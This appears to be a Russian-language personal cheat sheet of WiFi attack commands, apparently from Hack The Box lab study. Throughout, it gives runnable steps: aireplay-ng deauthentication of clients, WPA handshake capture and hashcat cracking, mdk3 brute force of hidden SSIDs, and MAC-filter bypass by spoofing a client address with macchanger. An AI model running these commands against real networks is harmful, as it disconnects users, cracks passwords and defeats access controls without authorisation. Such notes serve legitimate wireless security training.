# WIFI

# Сколько режимов программного интерфейса доступно?
    iw list 
    ищем 'software interface modes'

# Сканирование доступных сетей
    iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'

# Для подключения к сети
    sudo iwconfig wlan0 essid HTB-Wifi

# смена мощности интерфейса
    sudo iw reg set US
    sudo ifconfig wlan1 down
    sudo iwconfig wlan1 txpower 30
    sudo ifconfig wlan1 up
    iwconfig
    
Ту же информацию о чипсете и драйвере можем посмотреть с помощью утилиты airmon-ng.

sudo systemctl stop NetworkManager
sudo airmon-ng check kill

sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

iw dev

# Starting monitor mode
    sudo airmon-ng
    sudo airmon-ng check kill (если мешает)
    sudo airmon-ng start wlan1
    sudo airmon-ng stop wlan1mon
    
# скан всех сетй 

    sudo airodump-ng wlan1mon [--band abg]

# прослушивание конкретной сети

    sudo airodump-ng --bssid C4:6E:1F:71:EC:16 --channel 1 -w test wlan1mon
    sudo airodump-ng -c1 --bssid D8:D6:3D:EB:29:D5 -w capture wlan0mon

    
# деауз

    sudo aireplay-ng --deauth 10 -a C4:6E:1F:71:EC:16 -c 32:B8:F4:5F:FB:65 wlan1

    sudo airmon-ng stop wlan1
    sudo systemctl restart NetworkManager


    hcxpcapngtool -o hash.hc22000 test-01.cap

    hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Поиск скрытых SSID

    sudo airmon-ng start wlan0
    sudo airodump-ng -c 1 wlan0mon

    # Обнаружение скрытых SSID с помощью Deauth
    sudo airodump-ng -c 1 wlan0mon
    sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon

    # Подбор скрытого SSID методом перебора 
    sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
    -p заглавная буква (u)    цифры (n)    все напечатанные (а)    строчные и прописные буквы (c)    строчные и прописные буквы плюс цифры (м) 

    Перебор с использованием списка слов
    sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5

# Сохранение результата в файл 
    sudo airodump-ng wlan0mon -w HTB

# График взаимосвязей между клиентами и точкой доступа
    sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png
    
# Обход фильтрации по MAC-адресу 
    Сканирование доступных сетей Wi-Fi
    sudo airmon-ng start wlan0
    sudo airodump-ng wlan0mon
    Проверка что на 5 Ггц никого нет
    sudo airodump-ng wlan0mon --band a
    Выписываем нужный МАК
    sudo airmon-ng stop wlan0mon
    sudo macchanger wlan0
    sudo ifconfig wlan0 down
    sudo macchanger wlan0 -m 3E:48:72:B7:62:2A
    sudo ifconfig wlan0 up
    Теперь подключаемся к сети 5 Ггц
